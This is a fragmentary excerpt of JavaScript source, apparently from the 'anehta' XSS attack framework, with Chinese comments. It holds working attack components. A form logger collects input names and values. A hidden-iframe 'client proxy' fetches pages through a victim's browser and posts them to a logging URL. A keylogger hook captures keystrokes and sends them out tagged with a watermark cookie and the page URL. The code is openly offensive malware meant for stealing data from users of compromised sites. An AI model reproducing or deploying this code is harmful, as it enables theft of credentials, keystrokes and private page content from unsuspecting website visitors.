...
anehta.logger.logForm = function(o) {
	...
	for (var i = 0; i < inputs.length; i ++) {
		if (inputs[i].getAttribute("name") != null && 
			...
			param += encodeURIComponent(inputs[i].getAttribute("name")) + "=" + encodeURIComponent(inputs[i].value) + "&";
		}
	}
		    ...
		    //if(cache != ""){ // 有记录才发送,没有记录不发送
		        ...
		        if (cache_tmp == ""){ // 起初cache_tmp为空，将cache里的数据全部发送出去
		        	...
		        	cache = NoCryptMark + XssInfo_S + "Watermark: " + 
		                anehta.dom.getCookie("anehtaWatermark") + XssInfo_E + " [anehtaCacheSplit] " + 
		                "<requestURI>" + "\r\n<![CDATA[\r\n" + encodeURI(window.location.href) + "\r\n]]>\r\n" + "</requestURI>" + "\r\n" + // 获取当前URI
		                cache;
	            cache = encodeURIComponent(cache);
		          ...
		          var c_tmp = cache_tmp.split(" [anehtaCacheSplit] ");
		          var c = cache.split(" [anehtaCacheSplit] ");
		          var sendDiff = "";
		          ...
		          for (i=0; i < c.length; i++){
		            ...
		            // 没找到，记下来，准备发送                
                  sendDiff = sendDiff + c[i] ;//+ " [anehtaCacheSplit] "; // 还原信息头
		          ...
		          sendDiff = NoCryptMark + XssInfo_S + "Watermark: " + 
		                     ...
		                     "<requestURI>" + "\r\n<![CDATA[\r\n" + encodeURI(window.location.href) + "\r\n]]>\r\n" + "</requestURI>" + "\r\n" + // 获取当前URI
		                     sendDiff;
              sendDiff = encodeURIComponent(sendDiff);
...
anehta.ajax.post = function(url, param){ 
  // 第二个参数是提交的参数,第三个参数是headers
	anehtaXmlHttp.post(url, param, null, function(response, responseHeaders) {
		 ...
		 if (response != null) {
			 //alert(response);
			 anehtaCache.setItem("ajaxPostResponse", encodeURIComponent(response));
		 }		    
	 });
}
...
anehta.ajax.get = function(url){
  // 第二个参数是headers
	anehtaXmlHttp.get(url, null, function(response, responseHeaders) {
		...
		if (response != null) {
			//alert(response);
			anehtaCache.setItem("ajaxGetResponse", encodeURIComponent(response));
		}
	});
} 
...
// 安装客户端proxy
anehta.ajax.clientProxy = function(gotoURL, proxyMethod){	
	
	//需要加载一个定制的iframe
	var dd = document.createElement('div');
	var ifrname = "anehtaPostClientProxy";//生成一个随机的name
	dd.innerHTML = "<iframe id='" + ifrname + "' name='" + ifrname + "' width=0 height=0 ></iframe>";
	document.getElementsByTagName('body')[0].appendChild(dd);
	var ifr = document.getElementById(ifrname);
	
	if (proxyMethod == "Get"){
	  anehtaXmlHttp.get(gotoURL, null, function(response, responseHeaders) {
		  if (responseHeaders != null) {
			  //alert(responseHeaders);
		  }
		  ...
		  if (response != null) {
			  //alert(response);
			  // 发送页面回服务器
	      anehta.net.postFormIntoIframe(ifr, logurl, encodeURIComponent(response));
		  }
	  });
	}
		  ...
		  if (gotoURL.indexOf('?') > -1){		  	
		    postParam = gotoURL.split('?');
		    
		    gotoURL = postParam[0];
		    postParam = postParam[1];
		  }
		  //gotoURL = "http://" + (gotoURL.split('/'))[2];
		  
		  // post 请求
		  anehtaXmlHttp.post(gotoURL, postParam, null, function(response, responseHeaders) {
		    if (responseHeaders != null) {
			    //alert(responseHeaders);
		    }
...
var keyCodeMap = [{code:08, keyVal:" [backspace] "},
                  {code:09, keyVal:" [tab] "},
                  {code:13, keyVal:" [enter] "},
                  {code:16, keyVal:" [shift] "},
                  {code:17, keyVal:" [ctrl] "},
                  {code:18, keyVal:" [alt] "},
                  {code:19, keyVal:" [pause/break] "},
                  {code:20, keyVal:" [caps lock] "},
                  {code:27, keyVal:" [escape] "},
                  {code:32, keyVal:" [space] "},
                  {code:33, keyVal:" [page up] "},
                  {code:34, keyVal:" [page down] "},
                  {code:35, keyVal:" [end] "},
                  {code:36, keyVal:" [home] "},
                  {code:37, keyVal:" [left arrow] "},
                  {code:38, keyVal:" [up arrow] "},
                  {code:39, keyVal:" [right arrow] "},
                  {code:40, keyVal:" [down arrow] "},
                  {code:44, keyVal:" [print screen] "}, // 可能要 onkeyup 才能触发 
                  {code:45, keyVal:" [insert] "},
                  {code:46, keyVal:" [delete] "},
                  {code:91, keyVal:" [left window key] "},
                  {code:92, keyVal:" [right window key] "},
                  {code:93, keyVal:" [select key] "},
                  {code:96, keyVal:" [numpad 0] "},
                  {code:97, keyVal:" [numpad 1] "},
                  {code:98, keyVal:" [numpad 2] "},
                  {code:99, keyVal:" [numpad 3] "},
                  {code:100, keyVal:" [numpad 4] "},
                  {code:101, keyVal:" [numpad 5] "},
                  {code:102, keyVal:" [numpad 6] "},
                  {code:103, keyVal:" [numpad 7] "},
                  {code:104, keyVal:" [numpad 8] "},
                  {code:105, keyVal:" [numpad 9] "},
                  {code:106, keyVal:" [multiply] "},
                  {code:107, keyVal:" [add] "},
                  {code:109, keyVal:" [subtract] "},
                  {code:110, keyVal:" [decimal point] "},
                  {code:111, keyVal:" [divide] "},
                  {code:112, keyVal:" [F1] "},
                  {code:113, keyVal:" [F2] "},
                  {code:114, keyVal:" [F3] "},
                  {code:115, keyVal:" [F4] "},
                  ...
                  {code:122, keyVal:" [F11] "},
                  {code:123, keyVal:" [F12] "},
                  {code:144, keyVal:" [num lock] "},
                  {code:145, keyVal:" [scroll lock] "},
                  {code:186, keyVal:" [semi-colon] "},
                  {code:187, keyVal:" [equal sign] "},
                  {code:188, keyVal:" [comma] "},
                  {code:189, keyVal:" [dash] "},
                  {code:190, keyVal:" [period] "},
                  {code:191, keyVal:" [foward slash] "},
                  {code:192, keyVal:" [grave accent] "},
                  {code:219, keyVal:" [open bracket] "},
                  {code:220, keyVal:" [back slash] "},
                  {code:221, keyVal:" [close bracket] "},
                  {code:222, keyVal:" [single quote] "}			                  
                 ];
...
anehta.hook.installKeylogger = function(o, trigger){
  ...
  //var keycodeMap = [{"09":"Tab","65":"A"}];
  var showkey = ""; // 只显示可见字符
  
	window.installKeylogger = function(event){
		if (event.keyCode >= 48 && event.keyCode <= 90){ // 数字和字母
			showkey = String.fromCharCode(event.keyCode);
		} else {
			showkey = " [Special Key!] ";
			
			/*
			for (k=0; k<keyCodeMap.length; k++){              
			  if (event.keyCode == keyCodeMap[k].code){
				  showkey = keyCodeMap[k].keyVal;
				  //alert(showkey);
		  	}
		  } */             
		}
	  ...
	  keystrokes = encodeURIComponent(showkey);  
	  //keystrokes 最好多escape一遍，因为有不可见字符，会导致解析xml出错
	...
	if (trigger){
	  ...
	  if (trigger == "blur"){ // 元素blur时触发
	  	window.logKeyloggerOnBlur = function(){
	  		...
	  		// 提交数据比较多,需要使用post提交 ; 多escape一遍 
	  		keylogger = NoCryptMark + XssInfo_S + "Watermark: " + anehta.dom.getCookie("anehtaWatermark") + XssInfo_E +
	  		            "<requestURI>" + "\r\n<![CDATA[\r\n" + encodeURI(window.location.href) + "\r\n]]>\r\n" + "</requestURI>" + "\r\n" + // 获取当前URI
                    "<Keylogger>" + "\r\n<![CDATA[\r\n" + keylogger + "\r\n]]>\r\n" + "</Keylogger>";
        //alert(keylogger);
...
anehta.misc.htmlEncode = function(str){
...
anehta.misc.htmlDecode = function(strEncodeHTML){
  var div = document.createElement('div');
